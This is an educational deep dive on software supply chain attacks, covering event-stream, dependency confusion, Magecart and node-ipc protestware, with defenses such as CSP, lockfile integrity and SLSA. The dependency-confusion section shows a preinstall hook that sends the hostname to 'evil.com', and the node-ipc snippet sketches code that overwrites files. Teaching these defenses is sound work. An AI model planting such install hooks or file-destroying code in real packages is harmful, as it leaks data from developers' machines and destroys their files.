# Supply Chain Attacks — Deep Dive

## The Trust Graph

Every dependency is a transitive trust decision:

```
Your App
  └── express (you trust)
        └── body-parser (express trusts)
              └── raw-body (body-parser trusts)
                    └── unpipe (raw-body trusts)
                          └── ... (you've never heard of this)
```

You made one trust decision (`express`). But you're now running code from dozens of maintainers you've never evaluated. A compromise anywhere in this tree compromises your application.

## Attack Deep Dives

### event-stream (2018) — The Textbook Case

**Timeline:**
1. `event-stream` — popular npm package, 8M weekly downloads
2. Maintainer burned out, handed ownership to a stranger who asked nicely
3. New maintainer added `flatmap-stream` as a dependency
4. `flatmap-stream` contained AES-encrypted malicious payload
5. Payload specifically targeted the Copay Bitcoin wallet app
6. Stole Bitcoin private keys from Copay users
7. Went undetected for 2 months

**Lessons:**
- Social engineering targets maintainers, not code
- Obfuscated payloads bypass casual code review
- Targeted attacks hide in broad-reach packages
- npm has no "maintainer changed" alerts

### Dependency Confusion — How It Works

```
1. Attacker finds internal package name (from GitHub, error messages, job postings)
   Internal: @company/analytics-core

2. Attacker publishes to public npm:
   npm publish analytics-core --version 99.0.0

3. Victim's build system resolves packages:
   - Checks public npm: analytics-core@99.0.0 ✓
   - Checks private registry: @company/analytics-core@2.1.0 ✓
   - Higher version wins → installs attacker's package

4. Attacker's package runs install script:
   "scripts": { "preinstall": "curl https://evil.com/exfil?hostname=$(hostname)" }
```

**Prevention:**
```ini
# .npmrc — force scoped packages to resolve from private registry
@company:registry=https://registry.company.com/
# Never let @company/* resolve from public npm
```

### Magecart — Web Skimming at Scale

**Attack flow:**
1. Attacker compromises a third-party script provider (analytics, marketing, chat)
2. Injects card-skimming JavaScript into the script
3. Every website loading that script now has a skimmer
4. Skimmer waits for payment form submission
5. Copies card number, CVV, expiry to attacker's server
6. Original payment still processes — user and merchant notice nothing

**British Airways (2018):**
- Modified Modernizr script on ba.com
- Captured 380,000 payment cards over 15 days
- £20M GDPR fine

**Scale:** Group-IB tracked 570+ Magecart incidents in 2022 alone.

### Protestware — When Maintainers Attack

**node-ipc (2022):**
```javascript
// Added to node-ipc — a package with 1M+ weekly downloads
// Used by vue-cli, Unity, and thousands of projects
import { geo } from 'some-geo-lib';
if (geo.country === 'RU' || geo.country === 'BY') {
  // Overwrote files with ❤️ emoji
  fs.writeFileSync(filePath, '❤️');
}
```

This created a new threat model: maintainers as adversaries. No credential theft, no compromise — the legitimate maintainer decided to weaponize their package.

## Third-Party Script Risk Assessment

### What a third-party script can do:

- **Read the entire DOM** — form inputs, user data, session tokens
- **Set and read cookies** (if not HttpOnly)
- **Make network requests** to any origin (send data to attacker's server)
- **Modify the page** — inject forms, redirect users, overlay fake content
- **Access localStorage/sessionStorage**
- **Register Service Workers** (persistent control)
- **Mine cryptocurrency** using the user's CPU

### Risk tiers:

| Tier | Examples | Risk | Mitigation |
|------|----------|------|------------|
| **Critical** | Payment processors, auth SDKs | Full access to sensitive data | SRI, CSP, iframe isolation, audit regularly |
| **High** | Analytics, A/B testing, tag managers | Can read all page content | SRI, CSP, review loaded scripts |
| **Medium** | Chat widgets, social buttons | Limited interaction | Sandboxed iframes, lazy-load |
| **Low** | Fonts, static assets | Minimal code execution | SRI, self-host if possible |

## CSP for Third-Party Control

```http
Content-Security-Policy:
  script-src 'self' https://trusted-cdn.com;
  connect-src 'self' https://api.analytics.com;
  frame-src https://payment-provider.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  default-src 'self';
```

CSP limits:
- **Which domains** can serve scripts → blocks injected script tags pointing elsewhere
- **Whether inline scripts** execute → blocks `<script>alert(1)</script>` injections
- **Where data can be sent** → `connect-src` blocks exfiltration to attacker's server

## Lockfile Integrity

### package-lock.json integrity field
```json
{
  "lodash": {
    "version": "4.17.21",
    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
    "integrity": "sha512-v2kDE...="
  }
}
```

If someone publishes a modified version with the same version number:
- `npm ci` checks the integrity hash → **fails** if content changed
- `npm install` may **not** check — always use `npm ci` in CI/CD

### Why `npm ci` > `npm install` in CI:
1. Installs from lockfile exactly (no resolution)
2. Verifies integrity hashes
3. Removes `node_modules` first (clean install)
4. Fails if lockfile is out of sync with `package.json`

## SLSA Framework

Supply chain Levels for Software Artifacts — a security framework by Google:

| Level | Requirement |
|-------|-------------|
| SLSA 1 | Build process is documented |
| SLSA 2 | Hosted build service, authenticated provenance |
| SLSA 3 | Hardened build platform, non-falsifiable provenance |
| SLSA 4 | Two-party review, hermetic builds |

**Provenance** = a signed statement saying "this artifact was built from this source, by this builder, with these inputs." Consumers can verify before using.

## Incident Response Checklist

When a dependency is compromised:
1. **Identify blast radius** — which projects use this package? At which version?
2. **Pin to last known good version** in lockfile
3. **Audit for compromise indicators** — network requests to unknown domains, obfuscated code, install scripts
4. **Check if install scripts ran** — `preinstall`/`postinstall` execute on `npm install`
5. **Rotate secrets** if the package had access to env vars or credentials
6. **Scan build artifacts** — the compromised code may be bundled into your production assets
7. **Notify affected users** if data exfiltration is suspected
